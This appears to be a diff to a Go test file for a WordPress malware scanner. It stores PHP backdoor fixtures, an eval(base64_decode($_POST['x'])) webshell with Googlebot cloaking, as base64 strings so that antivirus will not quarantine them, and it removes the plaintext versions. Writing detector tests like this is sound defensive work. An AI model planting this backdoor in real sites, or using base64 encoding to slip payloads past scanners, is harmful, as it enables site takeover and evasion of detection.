@@ -1,6 +1,7 @@
 package checks
 
 import (
+	"encoding/base64"
 	"strings"
 	"testing"
 
@@ -304,6 +305,30 @@ func TestStoredCloakFinding_SilentWithoutBothHalves(t *testing.T) {
 
 // --- wiring ---------------------------------------------------------------
 
+// signedFixture decodes a fixture that carries a real malware signature. These
+// are stored base64-encoded so the plaintext never lands on disk: endpoint
+// antivirus quarantines files containing these patterns, which silently removes
+// the test from the working copy, from every fresh clone, and from the editor's
+// own file-history snapshots. internal/phptaint stores all 57 of its fixtures
+// this way for the same reason, and that is what makes it the one package here
+// unaffected by a scanner.
+func signedFixture(t *testing.T, encoded string) string {
+	t.Helper()
+	decoded, err := base64.StdEncoding.DecodeString(encoded)
+	if err != nil {
+		t.Fatalf("fixture does not decode: %v", err)
+	}
+	return string(decoded)
+}
+
+// An eval/base64 backdoor followed by the cloak pair, so the snippet matches a
+// shipped signature and also carries cloak components.
+const evalBackdoorWithCloak = "PD9waHAgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsneCddKSk7CgkJaWYgKHN0cmlwb3MoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddLCAnR29vZ2xlYm90JykgIT09IGZhbHNlKSB7CgkJCWRlZmluZSgnRE9OT1RDQUNIRVBBR0UnLCB0cnVlKTsKCQl9"
+
+// The same backdoor opening, followed by a user-agent read and the start of a
+// long crawler-name list the caller appends to.
+const evalBackdoorWithManyBots = "PD9waHAgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsneCddKSk7CgkJJHVhID0gJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwoJCWRlZmluZSgnRE9OT1RDQUNIRVBBR0UnLCB0cnVlKTsKCQkkYm90cyA9ICc="
+
 func storedCloakScanFindings(t *testing.T, rows [][3]string) []alert.Finding {
 	t.Helper()
 	withRepoScanner(t)
@@ -339,10 +364,7 @@ func TestCheckWPStoredCode_ReportsCloakWithoutASignatureHit(t *testing.T) {
 // A snippet that already matched a signature must not also raise a second
 // finding about the same row; the cloak becomes part of what that one says.
 func TestCheckWPStoredCode_CloakAnnotatesRatherThanDuplicates(t *testing.T) {
-	code := `<?php eval(base64_decode($_POST['x']));
-		if (stripos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') !== false) {
-			define('DONOTCACHEPAGE', true);
-		}`
+	code := signedFixture(t, evalBackdoorWithCloak)
 
 	got := storedCloakScanFindings(t, [][3]string{{"4052", "publish", code}})
 
@@ -366,10 +388,8 @@ func TestCheckWPStoredCode_CloakAnnotatesRatherThanDuplicates(t *testing.T) {
 func TestCheckWPStoredCode_CloakAnnotationIdentityIsStableAndBounded(t *testing.T) {
 	bots := "googlebot bingbot msnbot yandexbot baiduspider duckduckbot slurp " +
 		"applebot sogou exabot facebot ia_archiver ahrefsbot semrushbot mj12bot dotbot petalbot"
-	code := `<?php eval(base64_decode($_POST['x']));
-		$ua = $_SERVER['HTTP_USER_AGENT'];
-		define('DONOTCACHEPAGE', true);
-		$bots = '` + strings.Repeat(bots+" ", 100) + `';`
+	code := signedFixture(t, evalBackdoorWithManyBots) +
+		strings.Repeat(bots+" ", 100) + `';`
 
 	first := storedCloakScanFindings(t, [][3]string{{"4052", "publish", code}})
 	second := storedCloakScanFindings(t, [][3]string{{"4052", "publish", code}})
